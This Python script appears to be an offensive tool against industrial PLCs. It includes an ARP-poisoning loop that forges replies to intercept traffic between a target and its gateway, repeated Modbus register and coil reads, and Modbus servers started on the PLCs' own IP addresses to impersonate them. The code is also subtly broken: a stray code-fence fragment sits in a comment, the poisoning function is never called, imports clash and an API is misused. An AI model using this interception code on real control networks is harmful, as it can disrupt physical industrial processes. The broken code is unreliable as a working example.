import argparse
import json
from time import time, sleep
import threading
import subprocess
import requests
from scapy.all import ARP, Ether, srp, sendp
import glob
import os
import pandas as pd
from datetime import datetime
import time
import ray
import modbus_tk
import modbus_tk.defines as cst
from modbus_tk import modbus_tcp, hooks
import logging
import itertools
from time import sleep
from collections import defaultdict

# logger
logger = modbus_tk.utils.create_logger("console", level=logging.DEBUG)

logging.basicConfig(filename="plcHistoryTOOL",
                    filemode='a',
                    format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
                    datefmt='%H:%M:%S',
                    level=logging.DEBUG)

# parallel distributed execution
ray.init()


def arp_poison(target_ip, gateway_ip, attacker_mac):
    while True:
        # Create ARP packets for ARP poisoning
        target_packet = ARP(op=2, pdst=target_ip, hwdst=attacker_mac, psrc=gateway_ip)
        gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=attacker_mac, psrc=target_ip)

        # Send ARP packets for ARP poisoning
        sendp(target_packet, verbose=False)
        sendp(gateway_packet, verbose=False)

        # Wait for a certain period before repeating ARP poisoning
        time.sleep(2)


def connect_to_slave(ip, port):
    """Connect to the slave

    Args:
        ip (string): IP of the Modbus slave
        port (int): Port of the Modbus slave
    """
    # Connect to the slave
    ip = str(ip)
    port = int(port)
    master = modbus_tcp.TcpMaster(host=ip, port=port)
    master.set_timeout(5.0)
    logger.info("Connected to ip=%s:%s", ip, port)
    return master


def read_c(master):
    """Read coils, coils are addressed as follows: [0-xxx].[0-7]

    Args:
        master (object): To send the read command to the right PLC
    """
    registers = {}
    values = master.execute(1, cst.READ_COILS, 0, 90)
    count = 0
    for c in range(0, 11):
        for a in range(0, 8):
            registers['%QX' + str(c) + '.' + str(a)] = str(values[count])
            count += 1

    return registers


def read_ir(master):
    """Read input registers, IRs are addressed as follows: [0-xxx]

    Args:
        master (object): To send the read command to the right PLC
    """
    registers = {}
    values = master.execute(1, cst.READ_INPUT_REGISTERS, 0, 11)
    c = 0
    for i in values:
        registers['%IW' + str(c)] = str(i)
        c += 1
    return registers


def read_di(master):
    """Read discrete inputs, DIs are addressed as follows: [0-xxx].[0-7]

    Args:
        master (object): To send the read command to the right PLC
    """
    registers = {}
    values = master.execute(1, cst.READ_DISCRETE_INPUTS, 0, 90)
    count = 0
    for c in range(0, 11):
        for a in range(0, 8):
            registers['%IX' + str(c) + '.' + str(a)] = str(values[count])
            count += 1
    return registers


def read_mr(master):
    """Read memory registers, MRs are addressed as follows: [0-xxx] and are holding registers starting from address 1024

    Args:
        master (object): To send the read command to the right PLC
    """
    registers = {}
    values = master.execute(1, cst.READ_HOLDING_REGISTERS, 1024, 11)
    c = 0
    for i in values:
        registers['%MW' + str(c)] = str(i)
        c += 1
    return registers


def read_hr(master):
    """Read holding registers, HRs are addressed as follows: [0-xxx]

    Args:
        master (object): To send the read command to the right PLC
    """
    registers = {}
    values = master.execute(1, cst.READ_HOLDING_REGISTERS, 0, 11)
    c = 0
    for i in values:
        registers['%QW' + str(c)] = str(i)
        c += 1
    return registers


@ray.remote
def read_registers(name, ip, port, jport):
    name = str(name)
    ip = str(ip)
    port = str(port)
    single_plc_registers = defaultdict(dict)
    master = connect_to_slave(ip, port)
    single_plc_registers[ip]['DiscreteInputRegisters'] = read_di(master)
    single_plc_registers[ip]['InputRegisters'] = read_ir(master)
    single_plc_registers[ip]['HoldingOutputRegisters'] = read_hr(master)
    single_plc_registers[ip]['MemoryRegisters'] = read_mr(master)
    single_plc_registers[ip]['Coils'] = read_c(master)

    # ora = '2022-10-04 18_02_35.803401'

    #with open(f'historian/{name}-{jport}@{ora}.json', 'w') as sp:
     #   sp.write(json.dumps(single_plc_registers, indent=4))


def start_slaves(slaves):
    """Start the Modbus slaves"""
    for slave in slaves:
        slave.start()


def stop_slaves(slaves):
    """Stop the Modbus slaves"""
    for slave in slaves:
        slave.stop()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--plc', nargs='+', help='IP addresses of PLCs')
    parser.add_argument('--time', type=int, help='Capture duration in minutes')
    parser.add_argument('--prefix', nargs='+', help='Prefixes for JSON file selection, containing PLC info')
    parser.add_argument('--manual', action='store_true', help='Manually start the Modbus slaves')
    args = parser.parse_args()

    if not args.plc:
        print('Please provide the IP addresses of PLCs')
        return

    if not args.time:
        print('Please provide the capture duration')
        return

    prefixes = args.prefix
    plc_ips = args.plc

    directory = "registerCapture/historian/"

    json_files = []
    for prefix in prefixes:
        json_files.extend(glob.glob(os.path.join(directory, f"{prefix}*.json")))

    if not json_files:
        print('No JSON files found with the specified prefixes')
        return

    # Creazione degli slave Modbus
    slaves = []
    plc_masters = {}  # Dizionario per associare gli indirizzi IP alle istanze```python
    if args.manual:
        print("Starting in manual mode...")
    else:
        print("Starting in automatic mode...")

    for plc_ip in plc_ips:
        master = connect_to_slave(plc_ip, 5022)  # Modifica la porta se necessario
        slave = modbus_tcp.TcpServer(address=plc_ip)  # Inizializza il server Modbus per lo slave
        slave.add_slave(1, master)  # Associa l'istanza del master al numero slave 1
        slaves.append(slave)  # Aggiungi lo slave alla lista
        plc_masters[plc_ip] = master  # Associa l'indirizzo IP al master corrispondente

    # Avvio dei server Modbus per gli slave
    if not args.manual:
        start_slaves(slaves)

    t_end = time.time() + args.time * 60

    while time.time() < t_end:
        for plc_ip in plc_ips:
            read_registers.remote(f"plc-{plc_ip}", plc_ip, 5022,8503)  # Modifica la porta se necessario
        sleep(0.8)
    
    # Arresto dei server Modbus per gli slave
    if not args.manual:
        stop_slaves(slaves)


if __name__ == '__main__':
    main()
